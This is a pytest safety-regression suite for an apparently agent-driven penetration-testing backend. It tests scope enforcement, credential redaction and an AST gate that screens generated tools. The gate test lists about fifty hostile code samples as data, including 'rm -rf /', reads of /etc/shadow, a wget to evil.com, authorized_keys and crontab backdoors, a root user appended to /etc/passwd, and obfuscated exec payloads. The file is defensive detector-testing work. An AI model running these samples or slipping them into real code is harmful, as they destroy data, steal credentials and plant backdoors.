"""Suite 3 — Safety regression tests (T2).

These tests run on EVERY commit. A single failure blocks the merge.
They encode the safety invariants that must NEVER regress.

Section 18.3 of the v2.0 architecture.
"""

from __future__ import annotations

import random

import pytest

import asyncio

from backend.core.credential_vault import CredentialVault
from backend.core.event_bus import DurableEventLog, EventBus
from backend.core.exceptions import ScopeViolationError, ToolPermissionError
from backend.core.models import AgentType, FindingClassification, ScopeConfig, StealthLevel
from backend.core.scope_enforcer import ScopeEnforcer
from backend.core.xai_logger import XAILogger
from backend.intelligence.custom_tool_generator import ASTSecurityAnalyzer
from backend.verification.verification_loop import VerificationLoop
from backend.verification.verification_policy import DEFAULT_VERIFICATION_POLICY


# ---------------------------------------------------------------------------
# Safety test: scope_boundary_never_crossed
# ---------------------------------------------------------------------------

class TestScopeBoundaryNeverCrossed:
    """1,000 tool calls with random out-of-scope targets: zero execute.

    Tests all 4 ScopeEnforcer checks (target, port, protocol, excluded).
    """

    @pytest.fixture
    def scope(self):
        return ScopeConfig(
            targets=["192.168.1.0/24", "example.com"],
            excluded_targets=["192.168.1.1"],
            ports=[80, 443],
            protocols=["tcp"],
        )

    def _random_out_of_scope_target(self) -> str:
        """Generate a random IP outside 192.168.1.0/24."""
        while True:
            octets = [random.randint(1, 254) for _ in range(4)]
            if octets[0] != 192 or octets[1] != 168 or octets[2] != 1:
                return ".".join(str(o) for o in octets)

    def test_1000_random_out_of_scope_targets_all_rejected(self, scope):
        """Zero out-of-scope executions across 1,000 random targets."""
        blocked_count = 0

        for _ in range(1000):
            target = self._random_out_of_scope_target()
            try:
                ScopeEnforcer.check(scope, {"target": target})
            except ScopeViolationError:
                blocked_count += 1

        assert blocked_count == 1000, (
            f"Expected 1000 blocked, got {blocked_count} — "
            f"scope boundary was crossed!"
        )

    def test_excluded_target_always_blocked(self, scope):
        """Excluded target is always rejected, even within CIDR."""
        for _ in range(100):
            with pytest.raises(ScopeViolationError, match="exclusion"):
                ScopeEnforcer.check(scope, {"target": "192.168.1.1"})

    def test_out_of_scope_port_always_blocked(self, scope):
        """Out-of-scope ports are always rejected."""
        blocked = 0
        for port in range(1, 101):
            if port in (80, 443):
                continue
            try:
                ScopeEnforcer.check(scope, {"target": "192.168.1.100", "port": port})
            except ScopeViolationError:
                blocked += 1
        # 100 ports minus port 80 and 443 (but 443 is in range, 80 is in range)
        # range(1,101) = 1..100. Allowed: 80. 443 is NOT in 1..100.
        # So 99 ports are out of scope
        assert blocked == 99

    def test_out_of_scope_protocol_always_blocked(self, scope):
        """Out-of-scope protocols are always rejected."""
        for proto in ["udp", "icmp", "sctp"]:
            with pytest.raises(ScopeViolationError):
                ScopeEnforcer.check(scope, {"target": "192.168.1.100", "protocol": proto})


# ---------------------------------------------------------------------------
# Safety test: credential_never_logged
# ---------------------------------------------------------------------------

class TestCredentialNeverLogged:
    """Scan all XAI log entries and EventBus payloads: zero credential strings."""

    CREDENTIAL_PATTERNS = [
        "AKIAEXAMPLE",
        "wJalrXUtnFEMI",
        "SuperSecret123",
        "sk-hidden-key-test",
        "private-key-content",
    ]

    @pytest.fixture
    def xai_logger(self, tmp_path):
        return XAILogger(log_dir=tmp_path / "xai")

    @pytest.fixture
    async def event_bus(self, tmp_path):
        log = DurableEventLog(db_path=tmp_path / "safety_events.db")
        bus = EventBus(durable_log=log)
        await bus.initialize()
        yield bus
        await bus.close()

    @pytest.mark.asyncio
    async def test_credentials_never_in_xai_across_engagements(self, xai_logger):
        """Scan XAI entries across 100 synthetic decisions: zero credential strings."""
        vault = CredentialVault()
        vault.load_credentials({
            "aws": {"access_key": "AKIAEXAMPLE", "secret_key": "wJalrXUtnFEMI"},
            "api": {"token": "sk-hidden-key-test"},
        })

        # Simulate 100 decisions with credential-laden inputs
        for i in range(100):
            await xai_logger.log_decision(
                agent=f"TestAgent-{i}",
                action=f"scoutsuite api_key=AKIAEXAMPLE secret_key=wJalrXUtnFEMI target=10.0.0.{i}",
                result_summary=f"Found token=sk-hidden-key-test in response",
                reasoning="Testing credential redaction",
                metadata={
                    "_credentials": {"access_key": "AKIAEXAMPLE"},
                    "target": f"10.0.0.{i}",
                },
            )

        # Verify zero credential strings in any entry
        entries = xai_logger.get_entries()
        for entry in entries:
            full_text = f"{entry.action} {entry.result_summary} {entry.reasoning}"
            for pattern in self.CREDENTIAL_PATTERNS:
                assert pattern not in full_text, (
                    f"Credential '{pattern}' found in XAI entry for {entry.agent}"
                )
            assert entry.credential_present is False

    @pytest.mark.asyncio
    async def test_credentials_never_in_eventbus_payloads(self, event_bus):
        """Scan EventBus payloads: zero credential strings."""
        # Publish events that should never contain credentials
        for i in range(50):
            await event_bus.publish(
                "findings",
                "FINDING_CREATED",
                {
                    "finding_id": f"finding-{i}",
                    "target": f"10.0.0.{i}",
                    "severity": "high",
                    # Credentials should never be in payloads, but verify
                    "description": "SQL injection found",
                },
            )

        # Replay and check
        events = await event_bus.replay(0)
        for event in events:
            payload_str = str(event["payload"])
            for pattern in self.CREDENTIAL_PATTERNS:
                assert pattern not in payload_str, (
                    f"Credential '{pattern}' found in EventBus payload"
                )


# ---------------------------------------------------------------------------
# Safety test: custom_tool_ast_gate (T9 — NEW in M3)
# ---------------------------------------------------------------------------

class TestCustomToolASTGate:
    """50 generated tool samples with shell injection, eval/exec,
    os.system() patterns: zero pass Gate 1.

    Section 18.3 — custom_tool_ast_gate safety regression.
    """

    DANGEROUS_SAMPLES = [
        # subprocess(shell=True) variants
        'import subprocess\nsubprocess.run("ls", shell=True)',
        'import subprocess\nsubprocess.Popen(cmd, shell=True)',
        'import subprocess\nsubprocess.call(user_input, shell=True)',
        'import subprocess\nsubprocess.run(f"nmap {target}", shell=True)',
        'import subprocess\nsubprocess.Popen(["sh"], shell=True)',
        # eval/exec
        'eval(input("Enter code: "))',
        'exec(open("payload.py").read())',
        'eval(user_data)',
        'exec(compile(code, "<string>", "exec"))',
        'data = eval(response.text)',
        # os.system
        'import os\nos.system("rm -rf /")',
        'import os\nos.system(cmd)',
        'import os\nos.popen("cat /etc/passwd")',
        'import os\nos.exec("whoami")',
        'import os\nos.system(f"curl {url}")',
        # File writes outside safe dir
        'open("/etc/crontab", "w").write("* * * * * evil")',
        'open("/root/.ssh/authorized_keys", "a").write(key)',
        'open("/var/log/evil.log", "w").write("pwned")',
        'f = open("/home/user/backdoor.py", "w")',
        'open("/opt/malware.sh", "w").write(payload)',
        # Combined patterns
        'import os\nimport subprocess\nos.system("wget http://evil.com")\nsubprocess.run("sh", shell=True)',
        'eval("__import__(\'os\').system(\'id\')")',
        'exec("import os; os.system(\'whoami\')")',
        'import subprocess\nsubprocess.Popen("cat /etc/shadow", shell=True)',
        'import os\nos.popen(user_input).read()',
        # More subprocess shell=True
        'from subprocess import run\nrun("id", shell=True)',
        'import subprocess as sp\nsp.run(cmd, shell=True)',
        'subprocess.Popen("echo pwned", shell=True, stdout=subprocess.PIPE)',
        'subprocess.call("ls -la", shell=True)',
        'subprocess.check_output("whoami", shell=True)',
        # More eval/exec
        'result = eval(raw_input)',
        'exec(base64.b64decode(encoded_payload))',
        'eval(json.loads(data)["code"])',
        'exec(urllib.request.urlopen(url).read())',
        'eval(os.environ.get("PAYLOAD", ""))',
        # More os calls
        'import os\nos.execv("/bin/sh", ["/bin/sh"])',
        'import os\nos.execve("/bin/sh", ["/bin/sh"], {})',
        'import os\nos.execvp("sh", ["sh", "-c", cmd])',
        'import os\nos.system(request.args.get("cmd"))',
        'import os\nos.popen(f"dig {domain}")',
        # More file writes
        'open("/usr/local/bin/evil", "w").write("#!/bin/sh\nrm -rf /")',
        'with open("/tmp/not_optimus/bad.py", "w") as f:\n    f.write(code)',
        'open("/var/www/shell.php", "w").write(webshell)',
        'open("/root/backdoor", "w").write(payload)',
        'open("/etc/passwd", "a").write("hacker::0:0:::/bin/sh")',
        # Edge cases
        'import os\nos.system(chr(114)+chr(109))',
        'eval(chr(111)+chr(115))',
        '__import__("os").system("id")',
        'getattr(__import__("os"), "system")("id")',
        'exec("\\x69\\x6d\\x70\\x6f\\x72\\x74 os")',
    ]

    def test_50_dangerous_samples_all_rejected(self):
        """All 50 dangerous code samples must fail G1 AST gate."""
        analyzer = ASTSecurityAnalyzer()
        passed_count = 0
        passed_samples = []

        for i, code in enumerate(self.DANGEROUS_SAMPLES[:50]):
            result = analyzer.analyze(code)
            if result.passed:
                passed_count += 1
                passed_samples.append((i, code[:60]))

        assert passed_count == 0, (
            f"{passed_count}/50 dangerous samples passed G1 — safety violation! "
            f"Samples: {passed_samples}"
        )

    def test_safe_code_passes_g1(self):
        """Verify that legitimate safe code passes G1."""
        analyzer = ASTSecurityAnalyzer()
        safe_code = (
            'import json\n'
            'import sys\n'
            'import subprocess\n\n'
            'def main(target):\n'
            '    result = subprocess.run(["nmap", "-sV", target], '
            'capture_output=True, text=True)\n'
            '    findings = [{"port": 80, "service": "http"}]\n'
            '    with open("/tmp/optimus_tools/output.json", "w") as f:\n'
            '        json.dump(findings, f)\n'
            '    print(json.dumps(findings))\n\n'
            'if __name__ == "__main__":\n'
            '    main(sys.argv[1])\n'
        )
        result = analyzer.analyze(safe_code)
        assert result.passed, f"Safe code failed G1: {result.issues}"


# ---------------------------------------------------------------------------
# Safety test: verification_loop_tool_limit (NEW in M3)
# ---------------------------------------------------------------------------

class TestVerificationLoopToolLimit:
    """VerificationLoop attempts every tool in ExploitAgent namespace:
    all rejected by VerificationPolicy."""

    EXPLOIT_TOOLS = ["sqlmap", "dalfox", "commix", "ffuf", "msfconsole", "payload_crafter"]
    SCAN_TOOLS = ["nmap", "nikto", "nuclei", "masscan", "wpscan"]
    ALL_BLOCKED_TOOLS = EXPLOIT_TOOLS + SCAN_TOOLS

    def test_all_exploit_tools_rejected(self):
        """Every ExploitAgent tool must be rejected by VerificationPolicy."""
        policy = DEFAULT_VERIFICATION_POLICY
        for tool in self.ALL_BLOCKED_TOOLS:
            assert tool not in policy.allowed_tools, (
                f"Tool '{tool}' should NOT be in VerificationPolicy allowed_tools!"
            )

    def test_only_verification_tools_allowed(self):
        """Only curl, nmap_verify, testssl_readonly, httpx_probe are allowed."""
        policy = DEFAULT_VERIFICATION_POLICY
        expected = frozenset({"curl", "nmap_verify", "testssl_readonly", "httpx_probe"})
        assert policy.allowed_tools == expected


# ---------------------------------------------------------------------------
# Safety test: concurrent_scope_enforcer (NEW in M3)
# ---------------------------------------------------------------------------

class TestConcurrentScopeEnforcer:
    """100 concurrent ScopeEnforcer.check() calls — no race conditions."""

    @pytest.fixture
    def scope(self):
        return ScopeConfig(
            targets=["10.0.0.0/8"],
            excluded_targets=["10.0.0.1"],
            ports=[80, 443, 8080],
            protocols=["tcp"],
        )

    @pytest.mark.asyncio
    async def test_100_concurrent_scope_checks_deterministic(self, scope):
        """100 concurrent checks all produce deterministic results."""
        async def check_in_scope(target: str) -> bool:
            try:
                ScopeEnforcer.check(scope, {"target": target, "port": 80})
                return True
            except ScopeViolationError:
                return False

        # 50 in-scope + 50 out-of-scope
        tasks = []
        for i in range(50):
            tasks.append(check_in_scope(f"10.0.{i}.{i+2}"))  # In scope
        for i in range(50):
            tasks.append(check_in_scope(f"172.16.{i}.{i+1}"))  # Out of scope

        results = await asyncio.gather(*tasks)

        in_scope_results = results[:50]
        out_scope_results = results[50:]

        # All in-scope should pass
        assert all(in_scope_results), (
            f"Some in-scope targets were incorrectly blocked: "
            f"{sum(1 for r in in_scope_results if not r)} failures"
        )

        # All out-of-scope should fail
        assert not any(out_scope_results), (
            f"Some out-of-scope targets were incorrectly allowed: "
            f"{sum(1 for r in out_scope_results if r)} passes"
        )

    @pytest.mark.asyncio
    async def test_excluded_target_concurrent(self, scope):
        """Excluded target blocked even under concurrency."""
        async def check_excluded() -> bool:
            try:
                ScopeEnforcer.check(scope, {"target": "10.0.0.1"})
                return False  # Should not reach here
            except ScopeViolationError:
                return True  # Correctly blocked

        results = await asyncio.gather(*[check_excluded() for _ in range(100)])
        assert all(results), "Excluded target was not blocked in all concurrent checks"
